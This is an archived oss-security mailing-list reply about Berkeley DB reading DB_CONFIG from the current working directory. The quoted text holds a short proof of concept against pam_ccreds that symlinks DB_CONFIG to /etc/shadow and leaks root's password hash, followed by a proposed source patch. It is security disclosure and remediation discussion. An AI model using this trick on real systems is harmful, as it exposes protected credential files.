X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3613" "Thursday" "15" "June" "2017" "12:38:01" "-0700" "Ritwik Ghoshal" "ritwik.ghoshal@oracle.com" "<984d5eb4-ff73-b7ba-fe21-81db3c28f77e@oracle.com>" "93" "Re: [oss-security] Berkeley DB reads DB_CONFIG from cwd" "^Date:" nil nil "6" "2017061519:38:01" "[oss-security] Berkeley DB reads DB_CONFIG from cwd" (number mark "        ritwik.ghosh Jun 15   93/3613  " thread-indent "\"Re: [oss-security] Berkeley DB reads DB_CONFIG from cwd\"\n") "<20170615144050.GA25094@openwall.com>" ("<20170610220613.mfmmpjey2l4aptcj@jwilk.net>" "<20170615144050.GA25094@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 26349 invoked by uid 550); 15 Jun 2017 19:48:04 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 19878 invoked from network); 15 Jun 2017 19:37:38 -0000
References: <20170610220613.mfmmpjey2l4aptcj@jwilk.net>
 <20170615144050.GA25094@openwall.com>
Organization: Oracle Corporation
Message-ID: <984d5eb4-ff73-b7ba-fe21-81db3c28f77e@oracle.com>
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101
 Thunderbird/45.8.0
MIME-Version: 1.0
In-Reply-To: <20170615144050.GA25094@openwall.com>
Content-Type: text/plain; charset=windows-1252
Content-Transfer-Encoding: 7bit
X-Source-IP: aserv0022.oracle.com [141.146.126.234]
Date: Thu, 15 Jun 2017 12:38:01 -0700
From: Ritwik Ghoshal <ritwik.ghoshal@oracle.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] Berkeley DB reads DB_CONFIG from cwd
To: oss-security@lists.openwall.com

On 6/15/2017 7:40 AM, Solar Designer wrote:
> On Sun, Jun 11, 2017 at 12:06:13AM +0200, Jakub Wilk wrote:
>> Apparently Berkeley DB reads the DB_CONFIG configuration file from the 
>> current working directory by default[*]. This is surprising and AFAICT 
>> undocumented.
>>
>> Here's how to exploit it against pam_ccreds:
>>
>>    $ cat /etc/shadow
>>    cat: /etc/shadow: Permission denied
>>    $ ln -sf /etc/shadow DB_CONFIG
>>    $ /sbin/ccreds_chkpwd moo < /dev/null
>>    BDB1584 line 1: 
>>    root:$1$QRCEVRMX$sPppjXE42AZnUPuEWf87D.:17327:0:99999:7:::: incorrect 
>>    name-value pair
>>
>> (The above was tested on Debian jessie.)
>>
>> In the past, nss_db was also exploitable:
>> CVE-2010-0826
>>
>>
>> [*] More precisely, this seem to happen when you call db_create() with 
>> dbenv=NULL; or if you use the dbm_open() function.
> Besides possibly updating Postfix, what are distros going to do about
> this?  


> What is upstream going to do?  Have they been contacted?

Oracle is aware of this issue, and we are investigating.

--
Thanks,
-Ritwik


>
> In the source code, it isn't necessarily as simple as commenting out the
> undocumented functionality.  There doesn't appear to be any code
> specific to the undocumented functionality, since it is documented that
> the DB_CONFIG file is read from the environment's home directory and the
> code is there primarily for that purpose.  Problems arise when the
> environment is uninitialized, and it is unclear to me whether this was
> possibly meant to imply the environment's home directory is the current
> directory (but even if so, this behavior is dangerous and needs to go).
>
> At first, I tried checking for dbenv being NULL in __dbenv_config(),
> which is where the hard-coded DB_CONFIG file name is found.  However, at
> least when testing with Postfix' postmap program (without the recent
> workaround), dbenv is non-NULL there, and per strace postmap does indeed
> try to open DB_CONFIG in the current directory.  Thus, for now I opted
> for this patch checking for and curing the symptom:
>
> --- db-4.3.29/env/env_open.c.orig       2004-12-23 02:58:21 +0000
> +++ db-4.3.29/env/env_open.c    2017-06-15 13:59:43 +0000
> @@ -500,7 +500,7 @@ __dbenv_config(dbenv, db_home, flags)
>         if (p == NULL)
>                 fp = NULL;
>         else {
> -               fp = fopen(p, "r");
> +               fp = strcmp(p, "DB_CONFIG") ? fopen(p, "r") : NULL;
>                 __os_free(dbenv, p);
>         }
>
> This passes the postmap test for me (postmap no longer tries to open the
> file), but I wonder if it possibly broke db's own tests.  I can't easily
> run the tests as --enable-test says it needs TCL, which we don't
> package.
>
> While at it, I found that rep/rep_backup.c has a comment saying it skips
> DB_CONFIG, but the code actually skips DB_CONFIG* (that is, any filename
> starting with DB_CONFIG) due to use of strncmp():
>
>                 /*
>                  * Skip DB-owned files: ., ..,  __db*, DB_CONFIG, log*
>                  */
>                 if (strcmp(names[i], ".") == 0)
>                         continue;
>                 if (strcmp(names[i], "..") == 0)
>                         continue;
>                 if (strncmp(names[i], "__db", 4) == 0)
>                         continue;
>                 if (strncmp(names[i], "DB_CONFIG", 9) == 0)
>                         continue;
>                 if (strncmp(names[i], "log", 3) == 0)
>                         continue;
>
> Either the comment or the code is wrong (I think the code is wrong), but
> this is unimportant.
>
> Alexander

